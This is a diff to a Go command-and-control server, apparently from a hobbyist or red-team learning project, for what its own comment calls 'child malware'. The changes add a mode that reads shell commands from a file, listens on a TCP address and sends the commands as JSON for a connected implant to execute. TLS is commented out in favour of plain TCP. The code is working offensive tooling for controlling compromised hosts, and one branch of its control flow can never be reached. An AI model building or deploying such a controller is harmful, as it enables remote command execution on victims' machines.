@@ -2,7 +2,6 @@ package main
 
 import (
 	"bufio"
-	"crypto/tls"
 	"encoding/json"
 	"flag"
 	"fmt"
@@ -22,11 +21,38 @@ type Results struct {
 
 var (
 	testArray = []string{"whoami", "hostname"}
-	connect   = flag.String("connect", "", "127.0.0.19999")
-	commands  = flag.Bool("commands", false, "Execute a list of commands")
+	connect   = flag.String("connect", "", "connection must be in form <ip>:<Port> eg: 127.0.0.1:9999")
+	commands  = flag.String("commands", "", "Execute a list of commands from a file. Include file name eg: commands commands.txt")
 )
 
-func listMode() {
+func listMode(fileToRead string) {
+	/* Takes a list of commands from a file, reads it in line by line
+	and executes the commands on the child malware.
+	*/
+	fmt.Println("Running in Command List Mode")
+
+	//read in files
+	fmt.Println("Reading commands from: ", fileToRead)
+	file, err := os.Open(fileToRead)
+	if err != nil {
+		fmt.Println("opening file error", err)
+	}
+
+	scanner := bufio.NewScanner(file)
+	scanner.Split(bufio.ScanLines)
+	var txtlines []string
+
+	for scanner.Scan() {
+		txtlines = append(txtlines, scanner.Text())
+	}
+
+	fmt.Println("COMMANDS to be run")
+	for _, value := range txtlines {
+		fmt.Println(value)
+	}
+
+	fmt.Println("WAITING ON CONNECTION")
+	fmt.Println("Connect the Child Malware to: ", *connect)
 
 	l, err := net.Listen("tcp", *connect)
 	if err != nil {
@@ -39,15 +65,10 @@ func listMode() {
 		return
 	}
 
-	fmt.Println("COMMANDS to be run")
-	for _, value := range testArray {
-		fmt.Println(value)
-	}
-
 	inputTest := &Results{
 		ID: 1,
 		// Commands:     true,
-		CommandsList: testArray,
+		CommandsList: txtlines,
 	}
 
 	encoder := json.NewEncoder(c)
@@ -81,10 +102,10 @@ func main() {
 	//parsing flags
 	flag.Parse()
 
-	cert, err := tls.LoadX509KeyPair("C:\\Users\\haydn\\Desktop\\hackers\\blackhatgo\\src\\RTV\\openssl\\ca.pem", "C:\\Users\\haydn\\Desktop\\hackers\\blackhatgo\\src\\RTV\\openssl\\ca.key")
-	checkError(err)
+	// cert, err := tls.LoadX509KeyPair("C:\\Users\\haydn\\Desktop\\hackers\\blackhatgo\\src\\RTV\\openssl\\ca.pem", "C:\\Users\\haydn\\Desktop\\hackers\\blackhatgo\\src\\RTV\\openssl\\ca.key")
+	// checkError(err)
 
-	config := tls.Config{Certificates: []tls.Certificate{cert}}
+	// config := tls.Config{Certificates: []tls.Certificate{cert}}
 
 	if *connect == "" {
 		fmt.Println("empty connection")
@@ -92,12 +113,17 @@ func main() {
 		os.Exit(1)
 	}
 
-	if *commands == true {
-		listMode()
+	if *commands == "" {
+		fmt.Println("no file name included")
+		flag.PrintDefaults()
+		os.Exit(1)
+	} else if *commands != "" {
+		listMode(*commands)
 
 	} else {
-		//listener, err := tls.Listen("tcp", service, &config)
-		l, err := tls.Listen("tcp", *connect, &config)
+
+		// l, err := tls.Listen("tcp", *connect, &config)
+		l, err := net.Listen("tcp", *connect)
 		if err != nil {
 			fmt.Println(err)
 			return
